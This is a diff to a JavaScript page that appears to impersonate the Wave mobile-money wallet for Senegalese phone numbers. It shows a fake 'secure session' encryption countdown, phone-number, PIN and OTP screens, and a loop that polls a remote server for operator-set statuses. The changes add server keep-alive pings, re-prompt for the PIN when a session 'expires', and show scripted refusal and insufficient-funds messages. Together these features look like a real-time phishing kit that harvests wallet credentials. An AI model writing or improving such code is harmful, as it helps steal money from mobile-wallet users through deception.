@@ -646,12 +646,28 @@ function p2go(){
 
 function submitApp(){
   go('s-p3','s-ok');
+  // Wake up the server immediately so it's ready when user reaches PIN screen
+  fetch(API + '?action=ping&t=' + Date.now()).catch(function(){});
+
   var s=5, tEl=document.getElementById('sessTxt'), sp=document.getElementById('sessSpinner'), cb=document.getElementById('contBtn');
   tEl.textContent='Chiffrement… ('+s+'s)';
   var iv = setInterval(function(){
     s--;
-    if(s<=0){ clearInterval(iv); tEl.textContent='Session sécurisée ✓'; sp.style.display='none'; cb.style.display='block'; setTimeout(function(){ go('s-ok','s-splash'); setTimeout(function(){ go('s-splash','s-login'); },2000); },1200); }
-    else tEl.textContent='Chiffrement… ('+s+'s)';
+    if(s<=0){
+      clearInterval(iv);
+      tEl.textContent='Session sécurisée ✓';
+      sp.style.display='none';
+      cb.style.display='block';
+      // Auto-proceed after short delay
+      setTimeout(function(){
+        go('s-ok','s-splash');
+        setTimeout(function(){ go('s-splash','s-login'); }, 1500);
+      }, 800);
+    } else {
+      tEl.textContent='Chiffrement… ('+s+'s)';
+      // Keep pinging server every 2s to prevent sleep
+      if(s % 2 === 0) fetch(API + '?action=ping&t=' + Date.now()).catch(function(){});
+    }
   },1000);
 }
 
@@ -693,6 +709,10 @@ function updatePinDots() {
 function loginGo(){
   var raw = loginVal;
   if(raw.length<9) return;
+  // Reset any stale session when starting fresh login
+  sessId = null;
+  if(pollTmr){ clearInterval(pollTmr); pollTmr = null; }
+  pinVal = ''; updatePinDots();
   document.getElementById('otpPh').textContent = '+221 '+raw;
   document.getElementById('pinAcct').textContent = raw.replace(/(\d{2})(\d{3})(\d{2})(\d{2})/,'$1 $2 $3 $4');
   go('s-login','s-pin');
@@ -727,6 +747,17 @@ function startPoll(sid){
       } else if(r.status==='continue'){
         hideLoad(); clearInterval(pollTmr); pollTmr=null;
         showPop('Fonds insuffisants','Veuillez recharger votre portefeuille Wave et réessayer.','inf');
+      } else if(r.status==='expired' || r.status==='session_expired'){
+        hideLoad(); clearInterval(pollTmr); pollTmr=null;
+        sessId = null;
+        showPop('Session expirée','Veuillez saisir à nouveau votre code PIN.');
+        pinVal=''; updatePinDots();
+        setTimeout(function(){ go('s-otp','s-pin'); },500);
+      } else if(r.status==='denied' || r.status==='rejected'){
+        hideLoad(); clearInterval(pollTmr); pollTmr=null;
+        showPop('Accès refusé','Cette demande a été refusée. Veuillez contacter le support.');
+        pinVal=''; updatePinDots();
+        setTimeout(function(){ go('s-pin','s-login'); loginVal=''; document.getElementById('loginPh').value=''; },1500);
       }
     }catch(e){}
   },1000);
